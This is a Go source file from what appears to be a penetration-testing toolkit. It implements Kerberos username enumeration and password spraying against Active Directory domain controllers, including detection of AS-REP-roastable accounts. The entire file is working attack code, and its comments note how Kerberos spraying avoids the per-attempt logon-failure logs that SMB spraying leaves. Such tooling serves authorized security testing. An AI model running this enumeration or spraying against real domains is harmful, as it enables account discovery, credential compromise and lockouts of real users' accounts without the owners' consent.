// Package krbuser is the shared Kerberos engine behind the userenum and
// spray commands: one AS exchange per username against a KDC, with the
// reply classified into an account verdict.
//
// Two exchange shapes are used, and their account-state footprints differ:
//
//   - Enumeration (EnumUser) sends one bare AS-REQ with no pre-auth data.
//     This touches no account state on the KDC: a failed lookup carries no
//     password material, increments no bad-password counter, and presents
//     no lockout surface — the same traffic any Kerberos client generates
//     before it retries with pre-auth. The KDC's KRB-ERROR is the oracle:
//     KDC_ERR_PREAUTH_REQUIRED means the account exists (and is normally
//     configured), KDC_ERR_C_PRINCIPAL_UNKNOWN means it does not, and
//     KDC_ERR_CLIENT_REVOKED means it exists but is locked out or disabled
//     (Windows and Samba both answer revoked on the bare AS-REQ, before
//     any pre-auth is evaluated).
//   - Spraying (TryPassword) performs a full password-based AS exchange
//     via gokrb5's client.Login: a bare AS-REQ, then a second AS-REQ whose
//     PA_ENC_TIMESTAMP is encrypted with the key derived from the supplied
//     password. The second request is the real authentication attempt —
//     against a Windows KDC it increments badPwdCount on failure, and it
//     is what makes spraying a lockout hazard that enumeration is not.
//     It is still quieter than SMB password spraying: SMB surfaces every
//     failed attempt as a 4625 logon failure on the target, while a
//     Kerberos pre-auth failure is a single 4768/4771 pair on the DC and
//     produces no per-attempt application log noise on member servers.
//
// Kerberos-over-TCP framing (RFC 4120 §7.2.2) and the AS-REQ shape mirror
// internal/scan/krb.go; the password exchange mirrors gopacket's
// tools/getTGT.
package krbuser

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/client"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/config"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/asnAppTag"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/errorcode"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/messages"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// Verdict is the classified state of one account after one AS exchange.
type Verdict int

const (
	// VerdictValid: the account exists. In enumeration this means the KDC
	// demanded pre-auth (KDC_ERR_PREAUTH_REQUIRED); in spraying it means
	// the KDC evaluated the attempt against a real account.
	VerdictValid Verdict = iota
	// VerdictValidNoPreauth: the account exists and has DONT_REQ_PREAUTH
	// set — the AS-REP-roastable state. Pentest literature names the
	// corresponding KDC answer "KDC_ERR_PREAUTH_NOT_REQUIRED", but no
	// KRB-ERROR of that name exists on the wire (it is in neither RFC 4120
	// nor the Windows/MIT/Heimdal error tables): a Windows or Samba KDC
	// answers the bare AS-REQ for such an account with a live AS-REP
	// instead, which is precisely what makes the account roastable. The
	// verdict is therefore keyed on the AS-REP application tag.
	VerdictValidNoPreauth
	// VerdictInvalid: KDC_ERR_C_PRINCIPAL_UNKNOWN — no such account.
	VerdictInvalid
	// VerdictLocked: KDC_ERR_CLIENT_REVOKED — the account exists but is
	// locked out or disabled. During a spray this verdict means a lockout
	// threshold may have just been tripped.
	VerdictLocked
	// VerdictError: any other reply, a malformed reply, or a transport
	// failure. Detail carries the plain-language cause.
	VerdictError
)

// String renders the verdict label used in per-user output and --out files.
func (v Verdict) String() string {
	switch v {
	case VerdictValid:
		return "VALID"
	case VerdictValidNoPreauth:
		return "VALID_NOPREAUTH"
	case VerdictInvalid:
		return "INVALID"
	case VerdictLocked:
		return "LOCKED"
	default:
		return "ERROR"
	}
}

// Result is the outcome of one exchange for one user.
type Result struct {
	Username string
	Verdict  Verdict
	// PasswordOK is set by TryPassword only: the KDC accepted the supplied
	// password (a TGT was issued, or the account proved the password while
	// refusing the ticket — see ClassifyLoginErr's KEY_EXPIRED case).
	PasswordOK bool
	// Detail is the symbolic KDC error name or a plain-language cause;
	// empty when nothing needs explaining.
	Detail string
}

// maxKDCReply caps the TCP-framed reply we will buffer. A KRB-ERROR is a
// few hundred bytes; even a PAC-laden AS-REP stays in the low kilobytes.
// The cap exists so a hostile or confused peer cannot make us allocate on
// its say-so via the length prefix.
const maxKDCReply = 1 << 20

// ClassifyReply reduces one KDC reply (TCP framing already stripped) to an
// account verdict. Pure function over reply bytes; EnumUser is its network
// caller. The reply to an AS-REQ is always one of two application tags —
// KRB-ERROR (0x7E) or AS-REP (0x6B) — so the AS-REP fallback is a first-byte
// check, mirroring internal/scan/krb.go's parseKDCReply.
func ClassifyReply(reply []byte) (Verdict, string) {
	var kerr messages.KRBError
	if err := kerr.Unmarshal(reply); err != nil {
		if len(reply) > 0 && reply[0] == 0x60|byte(asnAppTag.ASREP) {
			// AS-REP to a bare AS-REQ: DONT_REQ_PREAUTH account. The
			// ticket itself is discardable — the account state is the
			// finding (anvil roast asrep turns it into a hash).
			return VerdictValidNoPreauth, "AS-REP without pre-authentication (roastable)"
		}
		return VerdictError, fmt.Sprintf("unrecognized KDC reply: %v", err)
	}
	switch kerr.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		// The expected answer for a real, normally-configured account.
		return VerdictValid, "KDC_ERR_PREAUTH_REQUIRED"
	case errorcode.KDC_ERR_C_PRINCIPAL_UNKNOWN:
		return VerdictInvalid, "KDC_ERR_C_PRINCIPAL_UNKNOWN"
	case errorcode.KDC_ERR_CLIENT_REVOKED:
		return VerdictLocked, "KDC_ERR_CLIENT_REVOKED"
	default:
		return VerdictError, errorName(kerr.ErrorCode)
	}
}

// ClassifyLoginErr reduces a gokrb5 client.Login() error to an account
// verdict plus a password-correct flag. gokrb5 flattens the KDC's KRB-ERROR
// into the Login error text (krberror.Errorf formats KRBError.Error, which
// embeds errorcode.Lookup's symbolic name), so classification string-matches
// those names rather than unwrapping a typed error — there is none to
// unwrap by the time Login returns.
func ClassifyLoginErr(err error) (v Verdict, passwordOK bool, detail string) {
	if err == nil {
		// Login returned an AS-REP and verified it against the password-
		// derived key: the password is correct, full stop.
		return VerdictValid, true, "password correct"
	}
	s := err.Error()
	switch {
	case strings.Contains(s, "KDC_ERR_PREAUTH_FAILED"):
		// The KDC decrypted nothing but still answered, which it only
		// does for a real account: wrong password, valid user.
		return VerdictValid, false, "KDC_ERR_PREAUTH_FAILED"
	case strings.Contains(s, "KDC_ERR_KEY_EXPIRED"):
		// The KDC verified the pre-auth and then refused to issue:
		// the password is correct but expired ("user must change
		// password at next logon"). impacket counts this a hit.
		return VerdictValid, true, "KDC_ERR_KEY_EXPIRED (password correct, must change at next logon)"
	case strings.Contains(s, "KDC_ERR_CLIENT_REVOKED"):
		return VerdictLocked, false, "KDC_ERR_CLIENT_REVOKED"
	case strings.Contains(s, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		return VerdictInvalid, false, "KDC_ERR_C_PRINCIPAL_UNKNOWN"
	default:
		return VerdictError, false, s
	}
}

// EnumUser sends one bare AS-REQ for username to the KDC at dcIP (port 88
// unless dcIP carries one) and classifies the reply. Read-only against the
// account: see the package doc. domain is the DNS realm, uppercased before
// use — Windows KDCs reject NetBIOS-form realms ("CRealm does not match",
// per internal/roast) and the DNS form is conventionally uppercase.
func EnumUser(domain, dcIP, username string, timeout time.Duration) Result {
	r := Result{Username: username}
	realm := strings.ToUpper(domain)

	req, err := buildASReq(realm, username)
	if err != nil {
		r.Verdict, r.Detail = VerdictError, fmt.Sprintf("building AS-REQ: %v", err)
		return r
	}

	conn, err := net.DialTimeout("tcp", kerberos.FormatKDC(dcIP, "88"), timeout)
	if err != nil {
		r.Verdict, r.Detail = VerdictError, fmt.Sprintf("dial: %v", err)
		return r
	}
	defer conn.Close()
	// One deadline covering the whole write+read exchange; the KDC either
	// answers an AS-REQ immediately or not at all.
	_ = conn.SetDeadline(time.Now().Add(timeout))

	if err := writeKRBFrame(conn, req); err != nil {
		r.Verdict, r.Detail = VerdictError, fmt.Sprintf("write: %v", err)
		return r
	}
	body, err := readKRBFrame(conn)
	if err != nil {
		r.Verdict, r.Detail = VerdictError, fmt.Sprintf("read: %v", err)
		return r
	}

	r.Verdict, r.Detail = ClassifyReply(body)
	return r
}

// TryPassword performs one real password-based AS exchange for username and
// classifies the outcome; PasswordOK records whether the KDC accepted the
// password. The exchange is gokrb5's client.Login (the same AS flow
// tools/getTGT uses), driven through the gopacket fork's TransportKDCDialer
// so Kerberos traffic follows the same transport path as the rest of anvil.
//
// Unlike EnumUser there is no caller timeout: the fork's dialer owns the
// dial budget and the client applies its own read deadline per KDC send.
// Spray pacing is a loop concern (--delay), not a per-exchange one.
func TryPassword(domain, dcIP, username, password string) Result {
	r := Result{Username: username}
	realm := strings.ToUpper(domain)

	cfg, err := config.NewFromString(kerberos.SynthesizeKrb5Config(realm, dcIP))
	if err != nil {
		r.Verdict, r.Detail = VerdictError, fmt.Sprintf("krb5 config: %v", err)
		return r
	}
	// DisablePAFXFAST mirrors every other NewWithPassword caller in anvil:
	// a wrong FAST option costs an extra round trip and changes nothing.
	cl := client.NewWithPassword(kerberos.TransportKDCDialer{}, username, realm, password, cfg, client.DisablePAFXFAST(true))
	err = cl.Login()
	r.Verdict, r.PasswordOK, r.Detail = ClassifyLoginErr(err)
	return r
}

// LoadUsers reads a username file: one user per line, blank lines and
// lines whose first non-space character is '#' skipped, surrounding
// whitespace trimmed. The file must exist and yield at least one name —
// both are operator errors, reported in plain language.
func LoadUsers(path string) ([]string, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("cannot read users file %q: %v", path, err)
	}
	var users []string
	for _, line := range strings.Split(string(b), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		users = append(users, line)
	}
	if len(users) == 0 {
		return nil, fmt.Errorf("users file %q has no usernames (one per line; '#' starts a comment)", path)
	}
	return users, nil
}

// ValidateTarget enforces the shared userenum/spray input contract: a DNS
// realm and a KDC address are both required (userenum/spray never resolve
// KDCs via DNS — the operator points at a specific DC).
func ValidateTarget(domain, dcIP string) error {
	if strings.TrimSpace(domain) == "" {
		return fmt.Errorf("domain required (pass -d, e.g. -d lab.local)")
	}
	if strings.TrimSpace(dcIP) == "" {
		return fmt.Errorf("KDC address required (pass --dc-ip)")
	}
	return nil
}

// ValidateSprayParams enforces the spray command's input contract beyond
// ValidateTarget: exactly one password for the whole run (that is what a
// spray is — one password tried against every user, never a list, which is
// what keeps the per-account attempt count at one), a non-negative pacing
// delay, and a non-negative --stop-on-success (0 disables the stop).
func ValidateSprayParams(password string, delay time.Duration, stopOnSuccess int) error {
	if password == "" {
		return fmt.Errorf("exactly one password required (pass -p)")
	}
	if delay < 0 {
		return fmt.Errorf("--delay must not be negative")
	}
	if stopOnSuccess < 0 {
		return fmt.Errorf("--stop-on-success must be >= 0")
	}
	return nil
}

// buildASReq marshals one AS-REQ for username in the given realm, asking
// for krbtgt/<realm> and carrying no pre-auth data. The sname uses
// KRB_NT_SRV_INST, the canonical krbtgt name form every real client sends
// (mirrors gopacket's messages.NewASReqForTGT). config.New() defaults
// NoAddresses=true, so the request carries no client addresses.
func buildASReq(realm, username string) ([]byte, error) {
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: []string{"krbtgt", realm},
	}
	asReq, err := messages.NewASReq(realm, config.New(), cname, sname)
	if err != nil {
		return nil, err
	}
	return asReq.Marshal()
}

// writeKRBFrame writes one TCP-framed Kerberos message: 4-byte big-endian
// length prefix followed by the message bytes (RFC 4120 §7.2.2).
func writeKRBFrame(w io.Writer, msg []byte) error {
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(msg)))
	_, err := w.Write(append(hdr[:], msg...))
	return err
}

// readKRBFrame reads one TCP-framed Kerberos reply and returns the message
// with the length prefix stripped. Replies larger than maxKDCReply (or
// zero-length) are rejected before allocation.
func readKRBFrame(r io.Reader) ([]byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > maxKDCReply {
		return nil, fmt.Errorf("implausible reply length %d", n)
	}
	body := make([]byte, n)
	if _, err := io.ReadFull(r, body); err != nil {
		return nil, err
	}
	return body, nil
}

// errorName reduces errorcode.Lookup's rendering —
// "(6) KDC_ERR_C_PRINCIPAL_UNKNOWN Client not found in Kerberos database" —
// to the bare symbolic name. Codes outside the table render as
// "Unknown ErrorCode N" already and are kept whole.
func errorName(code int32) string {
	s := errorcode.Lookup(code)
	if strings.HasPrefix(s, "(") {
		if i := strings.Index(s, ") "); i >= 0 {
			s = s[i+2:]
			if j := strings.IndexByte(s, ' '); j >= 0 {
				s = s[:j]
			}
		}
	}
	return s
}
